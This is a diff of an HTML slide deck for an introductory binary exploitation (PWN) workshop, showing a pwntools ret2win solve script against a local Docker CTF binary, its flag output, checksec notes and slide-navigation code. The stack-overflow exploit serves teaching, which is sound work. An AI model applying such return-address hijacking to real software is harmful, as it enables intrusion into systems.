+              <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 6px;">
+                Find a lone <code class="inline">ret</code> instruction using pwndbg or objdump:
+              </p>
+              <pre class="code-block"><span class="highlight-muted"># Method A: pwndbg rop</span>
+pwndbg&gt; rop --grep "ret"
+0x000000000040101a : ret
+
+<span class="highlight-muted"># Method B: pwntools ROP</span>
+ret_gadget = ROP(elf).find_gadget([<span class="highlight-green">'ret'</span>])[0]  <span class="highlight-muted"># 0x401016 / 0x40101a</span></pre>
+            </div>
+
+            <!-- Tab 3: Solve -->
+            <div class="tab-content" id="m64-solve">
+              <pre class="code-block"><span class="highlight-blue">from</span> pwn <span class="highlight-blue">import</span> *
+
+elf = ELF(<span class="highlight-green">'./challenge_x64'</span>)
+offset = <span class="highlight-green">40</span>
+ret_gadget = <span class="highlight-green">0x40101a</span>
+flag_address = <span class="highlight-green">0x401276</span>
+
+payload = <span class="highlight-purple">b'A'</span> * offset
+payload += pack(ret_gadget)
+payload += pack(flag_address)
+
+<span class="highlight-blue">if</span> args.REMOTE:
+    p = remote(<span class="highlight-green">'127.0.0.1'</span>, <span class="highlight-green">9002</span>)
+<span class="highlight-blue">else</span>:
+    p = process(<span class="highlight-green">'./challenge_x64'</span>)
+
+p.sendlineafter(<span class="highlight-purple">b'&gt;'</span>, <span class="highlight-purple">b'1'</span>)
+p.sendlineafter(<span class="highlight-purple">b'name? '</span>, payload)
+p.interactive()</pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3 class="section-header">Execution &amp; Result</h3>
+          <p style="font-size: 0.9rem; margin-bottom: 10px;">
+            Connecting to local Docker container on port 9002:
+          </p>
+          <pre class="code-block" style="color: #6ee7b7;">
+$ python3 solve.py REMOTE
+[+] Opening connection to 127.0.0.1 on port 9002: Done
+[*] Switching to interactive mode
+
+Your hacker profile:
+Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@
+
+Flag: 🚩 HTB{x64_st4ck_sm4sh1ng_pr0}</pre>
+          <div style="margin-top: 14px; padding: 10px; background: rgba(159, 239, 0, 0.08); border-left: 4px solid var(--htb-green); border-radius: 4px;">
+            <p style="font-size: 0.85rem; color: var(--text-main);">
+              <strong>Key lesson:</strong> Both 32-bit and 64-bit challenges follow the exact same 3 steps: <em>Find Overflow ➔ Calculate Offset ➔ Overwrite Return Address</em>. 64-bit just needs a <code class="inline">ret</code> gadget for stack alignment!
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 13: Security Mitigations (checksec) -->
     <section class="slide" data-title="Security Mitigations (checksec)">
       <h1 class="slide-title">Binary Protections: <span class="accent">checksec</span></h1>
       <h2 class="slide-subtitle">Modern defenses designed to stop memory exploitation</h2>
@@ -1133,14 +1333,14 @@ RELRO:    <span class="highlight-blue">Partial RELRO</span>
 Stack:    <span class="highlight-red">No canary found</span>
 NX:       <span class="highlight-green">NX enabled</span>
 PIE:      <span class="highlight-red">No PIE (0x400000)</span></pre>
-          <p style="font-size: 0.92rem; color: var(--text-muted); margin-top: 12px;">
+          <p style="font-size: 0.88rem; color: var(--text-muted); margin-top: 12px;">
             In our meetup challenges, <strong>No Canary</strong> and <strong>No PIE</strong> allow us to overwrite RIP with fixed function addresses directly.
           </p>
         </div>
 
         <div class="card">
           <h3 class="section-header">Mitigation Matrix</h3>
-          <ul style="list-style: none; display: flex; flex-direction: column; gap: 10px; font-size: 0.88rem;">
+          <ul style="list-style: none; display: flex; flex-direction: column; gap: 8px; font-size: 0.85rem;">
             <li>
               <strong>NX / DEP (No-Execute):</strong>
               <div style="color: var(--text-muted);">Marks stack non-executable. Stops injected shellcode, but does NOT stop ret2win or ROP.</div>
@@ -1162,80 +1362,32 @@ PIE:      <span class="highlight-red">No PIE (0x400000)</span></pre>
       </div>
     </section>
 
-    <!-- Slide 12: Workshop Roadmap & Hands-on Lab -->
-    <section class="slide" data-title="Hands-on Lab & Mini-CTF">
-      <h1 class="slide-title">Workshop Challenges: <span class="accent">Lab &amp; Mini-CTF</span></h1>
-      <h2 class="slide-subtitle">Ready to exploit live binaries in your Colima environment</h2>
-
-      <div class="grid-2">
-        <div class="card">
-          <div class="card-header">
-            <span class="card-title">1. Guided Hands-on (<code class="inline">handson/</code>)</span>
-            <span class="brand-badge">Local Testing</span>
-          </div>
-          <p style="margin-bottom: 12px; font-size: 0.92rem;">
-            Practice basic ret2win mechanics with direct source code &amp; local binary debugging:
-          </p>
-          <pre class="code-block">
-cd handson
-./build.sh
-
-# Debug &amp; test x64
-gdb ./x64/challenge
-cd x64 &amp;&amp; python3 solve.py
-
-# Debug &amp; test x86
-cd ../x86 &amp;&amp; python3 solve.py</pre>
-        </div>
-
-        <div class="card">
-          <div class="card-header">
-            <span class="card-title">2. Mini-CTF (<code class="inline">mini-ctf/</code>)</span>
-            <span class="brand-badge" style="background: var(--cyber-blue); color: #000;">Docker Network CTF</span>
-          </div>
-          <p style="margin-bottom: 12px; font-size: 0.92rem;">
-            Simulated CTF environment running vulnerable daemons on localhost ports:
-          </p>
-          <pre class="code-block">
-cd mini-ctf
-docker compose up -d
-./extract-binaries.sh
-
-# Port 9001: 32-bit CTF daemon
-python3 x86/solve.py
-
-# Port 9002: 64-bit CTF daemon
-python3 x64/solve.py</pre>
-        </div>
-      </div>
-    </section>
-
-    <!-- Slide 13: Apple Silicon Workflow Quick-Reference -->
-    <section class="slide" data-title="Apple Silicon Quick Reference">
-      <h1 class="slide-title">Apple Silicon (M1–M4) <span class="accent">Architecture</span></h1>
-      <h2 class="slide-subtitle">High speed, low battery usage: Ghidra on macOS + Colima for Linux execution</h2>
+    <!-- Slide 14: Apple Silicon Quick-Reference -->
+    <section class="slide" data-title="Apple Silicon & Colima Setup">
+      <h1 class="slide-title">Apple Silicon Setup: <span class="accent">Colima &amp; Ghidra</span></h1>
+      <h2 class="slide-subtitle">Zero lag, low battery: macOS Ghidra + Colima x86_64 execution</h2>
 
       <div class="grid-2">
         <div class="card">
           <h3 class="section-header">Split Architecture Benefit</h3>
-          <ul style="list-style: none; display: flex; flex-direction: column; gap: 12px; font-size: 0.92rem;">
+          <ul style="list-style: none; display: flex; flex-direction: column; gap: 10px; font-size: 0.88rem;">
             <li style="display: flex; gap: 10px;">
               <span class="highlight-green">⚡</span>
-              <div><strong>Native macOS Ghidra:</strong> Zero GUI cursor lag, full hardware acceleration, retina resolution.</div>
+              <div><strong>Native macOS Ghidra:</strong> Zero GUI cursor lag, full hardware acceleration, retina resolution (<code class="inline">brew install ghidra</code>).</div>
             </li>
             <li style="display: flex; gap: 10px;">
               <span class="highlight-green">🐧</span>
-              <div><strong>Headless Colima (QEMU x86_64):</strong> Lightweight (~2GB RAM vs 8GB+ for full Kali VM).</div>
+              <div><strong>Headless Colima (QEMU x86_64):</strong> Only ~2GB RAM vs 8GB+ for full Kali VM.</div>
             </li>
             <li style="display: flex; gap: 10px;">
               <span class="highlight-green">🔄</span>
-              <div><strong>Shared Filesystem:</strong> Files in macOS are automatically mapped inside Colima at <code class="inline">/Users/...</code>!</div>
+              <div><strong>Shared Filesystem:</strong> Files in macOS are automatically mounted inside Colima at <code class="inline">/Users/...</code>!</div>
             </li>
           </ul>
         </div>
 
         <div class="card">
-          <h3 class="section-header">Cheat Sheet</h3>
+          <h3 class="section-header">Attendee Terminal Commands</h3>
           <pre class="code-block">
 <span class="highlight-muted"># 1. Start Colima (macOS Terminal)</span>
 colima start --arch x86_64 --vm-type qemu
@@ -1243,44 +1395,45 @@ colima start --arch x86_64 --vm-type qemu
 <span class="highlight-muted"># 2. Enter Linux shell</span>
 colima ssh
 
-<span class="highlight-muted"># 3. Work like Kali Linux inside Colima</span>
-cd /Users/&lt;your-username&gt;/.../htb-meetup-pwn
-gdb ./handson/x64/challenge
+<span class="highlight-muted"># 3. Inside Colima: install tools</span>
+cd /Users/&lt;user&gt;/.../htb-meetup-pwn
+./scripts/install-tools.sh --skip-ghidra
 
-<span class="highlight-muted"># 4. Open Ghidra on macOS (new terminal tab)</span>
-ghidra</pre>
+<span class="highlight-muted"># 4. Compile, debug, and exploit</span>
+gdb ./handson/x64/challenge
+python3 handson/x64/solve.py</pre>
         </div>
       </div>
     </section>
 
-    <!-- Slide 14: Conclusion & Q&A -->
+    <!-- Slide 15: Conclusion & Q&A -->
     <section class="slide" data-title="Conclusion & Q&A">
       <div style="max-width: 900px; text-align: center; margin: 0 auto;">
-        <span class="brand-badge" style="font-size: 0.9rem; padding: 4px 12px; margin-bottom: 16px; display: inline-block;">SESSION COMPLETE</span>
+        <span class="brand-badge" style="font-size: 0.9rem; padding: 4px 12px; margin-bottom: 14px; display: inline-block;">SESSION COMPLETE</span>
         <h1 class="slide-title">Happy <span class="accent">Hacking</span>! 🚩</h1>
         <h2 class="slide-subtitle">Questions, Comments, &amp; Discussion</h2>
 
-        <div class="grid-3" style="margin-top: 36px; text-align: left;">
+        <div class="grid-3" style="margin-top: 30px; text-align: left;">
           <div class="card">
-            <h4 style="color: var(--htb-green); font-size: 1.05rem; margin-bottom: 8px;">Next Steps</h4>
-            <p style="font-size: 0.88rem; color: var(--text-muted);">
-              Practice on Hack The Box PWN track, PicoCTF, and pwn.college to master Return Oriented Programming (ROP).
+            <h4 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 8px;">Key Takeaway</h4>
+            <p style="font-size: 0.85rem; color: var(--text-muted);">
+              PWN is not magic. It is strictly understanding how the compiler arranges memory and turning unexpected inputs into controlled outcomes.
             </p>
           </div>
 
           <div class="card">
-            <h4 style="color: var(--cyber-blue); font-size: 1.05rem; margin-bottom: 8px;">Challenge Writeup</h4>
-            <p style="font-size: 0.88rem; color: var(--text-muted);">
-              Complete detailed solution writeup available at:<br>
-              <a href="https://ctf.danplace.tech/posts/htb-meetup-iium/" target="_blank" style="color: var(--htb-green); font-weight: bold;">ctf.danplace.tech</a>
+            <h4 style="color: var(--cyber-blue); font-size: 1rem; margin-bottom: 8px;">Full Writeup</h4>
+            <p style="font-size: 0.85rem; color: var(--text-muted);">
+              Read the complete detailed blog post at:<br>
+              <a href="https://ctf.danplace.tech/posts/htb-meetup-iium/" target="_blank" style="color: var(--htb-green); font-weight: bold; text-decoration: none;">ctf.danplace.tech</a>
             </p>
           </div>
 
           <div class="card">
-            <h4 style="color: var(--cyber-purple); font-size: 1.05rem; margin-bottom: 8px;">Connect</h4>
-            <p style="font-size: 0.88rem; color: var(--text-muted);">
-              GitHub: <a href="https://github.com/danishhakim" target="_blank" style="color: #ffffff;">@danishhakim</a><br>
-              Meetup: HTB Meetup IIUM 2025
+            <h4 style="color: var(--cyber-purple); font-size: 1rem; margin-bottom: 8px;">Connect</h4>
+            <p style="font-size: 0.85rem; color: var(--text-muted);">
+              Speaker: Danish Hakim (<a href="https://github.com/danishhakim" target="_blank" style="color: #ffffff;">@danishhakim</a>)<br>
+              Host: HTB Meetup IIUM 2025
             </p>
           </div>
         </div>
@@ -1298,14 +1451,14 @@ ghidra</pre>
       <span><kbd>F</kbd> Fullscreen</span>
     </div>
     <div>
-      <span>HTB Meetup • Intro to PWN</span>
+      <span>HTB Meetup IIUM • Intro to PWN</span>
     </div>
   </footer>
 
   <!-- Overview Modal -->
   <div class="overview-modal" id="overviewModal">
     <div style="display: flex; justify-content: space-between; align-items: center;">
-      <h2 style="font-size: 1.5rem; color: #ffffff;">Slide Overview</h2>
+      <h2 style="font-size: 1.4rem; color: #ffffff;">Slide Overview</h2>
       <button class="btn btn-primary" id="btnCloseOverview">Close (Esc)</button>
     </div>
     <div class="overview-grid" id="overviewGrid"></div>
@@ -1313,7 +1466,7 @@ ghidra</pre>
 </div>
 
 <script>
-  // Slide Deck State Management
+  // Slide Deck State
   const slides = Array.from(document.querySelectorAll('.slide'));
   let currentSlideIndex = 0;
 
@@ -1329,40 +1482,25 @@ ghidra</pre>
 
   function updateSlide(index) {
     if (index < 0 || index >= slides.length) return;
-
     slides[currentSlideIndex].classList.remove('active');
     currentSlideIndex = index;
     slides[currentSlideIndex].classList.add('active');
 
-    // Update Counter & Progress
     slideIndicator.textContent = `Slide ${currentSlideIndex + 1} / ${slides.length}`;
     const percent = ((currentSlideIndex + 1) / slides.length) * 100;
     progressBar.style.width = `${percent}%`;
 
-    // URL Hash update for easy sharing/reloading
     window.location.hash = `#slide-${currentSlideIndex + 1}`;
   }
 
-  function nextSlide() {
-    if (currentSlideIndex < slides.length - 1) {
-      updateSlide(currentSlideIndex + 1);
-    }
-  }
+  function nextSlide() { if (currentSlideIndex < slides.length - 1) updateSlide(currentSlideIndex + 1); }
+  function prevSlide() { if (currentSlideIndex > 0) updateSlide(currentSlideIndex - 1); }
 
-  function prevSlide() {
-    if (currentSlideIndex > 0) {
-      updateSlide(currentSlideIndex - 1);
-    }
-  }
-
-  // Keyboard navigation
   window.addEventListener('keydown', (e) => {
-    // If typing in the interactive simulator input, don't trigger slide changes on space/arrow keys
     if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
       if (e.key === 'Escape') e.target.blur();
       return;
     }
-
     if (e.key === 'ArrowRight' || e.key === ' ' || e.key === 'PageDown') {
       e.preventDefault();
       nextSlide();
@@ -1381,7 +1519,6 @@ ghidra</pre>
   btnPrev.addEventListener('click', prevSlide);
   btnNext.addEventListener('click', nextSlide);
 
-  // Fullscreen Toggle
   function toggleFullscreen() {
     if (!document.fullscreenElement) {
       document.documentElement.requestFullscreen().catch(() => {});
@@ -1391,7 +1528,6 @@ ghidra</pre>
   }
   btnFullscreen.addEventListener('click', toggleFullscreen);
 
-  // Slide Overview Grid
   function buildOverviewGrid() {
     overviewGrid.innerHTML = '';
     slides.forEach((slide, idx) => {
@@ -1399,8 +1535,8 @@ ghidra</pre>
       const thumb = document.createElement('div');
       thumb.className = `slide-thumb ${idx === currentSlideIndex ? 'current' : ''}`;
       thumb.innerHTML = `
-        <span class="slide-thumb-num">Slide ${idx + 1}</span>
-        <span class="slide-thumb-title">${title}</span>
+        <span class="slide-thumb-num" style="color: var(--htb-green); font-size: 0.72rem; font-weight: bold;">Slide ${idx + 1}</span>
+        <span class="slide-thumb-title" style="color: #fff; font-size: 0.9rem; font-weight: 600;">${title}</span>
       `;
       thumb.addEventListener('click', () => {
         updateSlide(idx);
@@ -1418,17 +1554,24 @@ ghidra</pre>
   btnOverview.addEventListener('click', toggleOverview);
   btnCloseOverview.addEventListener('click', () => overviewModal.classList.remove('open'));
 
-  // Initialize from Hash
   if (window.location.hash) {
     const match = window.location.hash.match(/#slide-(\d+)/);
     if (match) {
       const target = parseInt(match[1], 10) - 1;
-      if (target >= 0 && target < slides.length) {
-        updateSlide(target);
-      }
+      if (target >= 0 && target < slides.length) updateSlide(target);
     }
   } else {
     updateSlide(0);
+  }
+
+  // --- TAB SWITCHER HELPER ---
+  function switchTab(btn, contentId) {
+    const parent = btn.closest('.tab-container');
+    parent.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    parent.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    btn.classList.add('active');
+    const target = parent.querySelector(`#${contentId}`);
+    if (target) target.classList.add('active');
   }
 
   // --- INTERACTIVE MEMORY EXPLORER LOGIC ---
@@ -1437,7 +1580,7 @@ ghidra</pre>
       title: "The Stack (Local Variables & Frames)",
       perms: "RW- (Read / Write)",
       permColor: "#a855f7",
-      desc: "Grows downward from high to low memory. Holds local function buffers (e.g. char buf[64]), function arguments, and the crucial Return Address (RIP/EIP) indicating where the CPU resumes execution after function exit.",
+      desc: "Grows downward from high to low memory. Holds local function buffers (e.g. char buffer[64]), function arguments, and the crucial Return Address (RIP/EIP) indicating where the CPU resumes execution after function exit.",
       sec: "Target of Stack-Based Buffer Overflows! If an input exceeds the buffer size without checking, it spills over and directly overwrites Saved RBP and the Return Address."
     },
     heap: {
@@ -1451,14 +1594,14 @@ ghidra</pre>
       title: "BSS Segment (Uninitialized Globals)",
       perms: "RW- (Read / Write)",
       permColor: "#eab308",
-      desc: "Contains global and static variables that are declared without an initial value (or initialized to zero). Initialized to null bytes by the OS loader at execution start.",
-      sec: "Commonly used in exploits as a stable destination to write shellcode or counterfeit strings because its address is often static (if No-PIE)."
+      desc: "Contains global and static variables declared without an initial value (or set to zero). Initialized to null bytes by the OS loader at execution start.",
+      sec: "Commonly used in exploits as a stable destination to write shellcode or counterfeit strings because its address is static (if No-PIE)."
     },
     data: {
       title: "Data Segment (Initialized Globals)",
       perms: "RW- (Read / Write)",
       permColor: "#3b82f6",
-      desc: "Holds global and static variables initialized explicitly in the C source code (e.g. int counter = 10; or global pointer arrays).",
+      desc: "Holds global and static variables initialized explicitly in the C source code (e.g. int counter = 10; or global string constants).",
       sec: "Global variables stored here can sometimes be corrupted if adjacent arrays are overwritten."
     },
     text: {
@@ -1466,7 +1609,7 @@ ghidra</pre>
       perms: "R-X (Read & Execute)",
       permColor: "#ef4444",
       desc: "Contains the raw compiled assembly instructions of the program. Marked strictly Read and Execute (R-X) so program code cannot be accidentally or maliciously overwritten.",
-      sec: "In ret2win and ROP exploits, we redirect RIP to existing functions or 'gadgets' residing right here inside the Text segment!"
+      sec: "In ret2win and ROP exploits, we redirect RIP to existing functions (win(), get_flag()) or gadgets residing right here inside the Text segment!"
     }
   };
 
@@ -1525,7 +1668,7 @@ ghidra</pre>
       memRbp.textContent = "0x7fffffffe860 (Caller RBP)";
       rowRbp.classList.remove('corrupted', 'pwned');
     } else {
-      memRbp.textContent = `Corrupted with: "${rbpSlice}"`;
+      memRbp.textContent = `Corrupted: "${rbpSlice}"`;
       rowRbp.classList.add('corrupted');
     }
 
@@ -1538,7 +1681,6 @@ ghidra</pre>
       simStatusText.textContent = "🟢 Normal Execution: Program returns safely to <main+80>.";
       simRipVal.textContent = "RIP = 0x401290";
     } else {
-      // Check if ret2win payload
       if (raw.includes("WIN") || raw.includes("\xb6\x11\x40") || raw.includes("0x4011b6")) {
         memRip.textContent = "0x00000000004011b6 (<win>) [OVERWRITTEN!]";
         rowRip.classList.remove('corrupted');
@@ -1551,7 +1693,7 @@ ghidra</pre>
         rowRip.classList.remove('pwned');
         rowRip.classList.add('corrupted');
         simStatusBanner.className = "sim-status-banner status-crash";
-        simStatusText.textContent = `💥 SEGFAULT! Invalid return address (${toHexAscii(ripSlice)}). Process crashes (SIGSEGV)!`;
+        simStatusText.textContent = `💥 SEGFAULT! Invalid return address (0x${toHexAscii(ripSlice)}). Process crashes!`;
         simRipVal.textContent = `RIP = 0x${toHexAscii(ripSlice)}`;
       }
     }
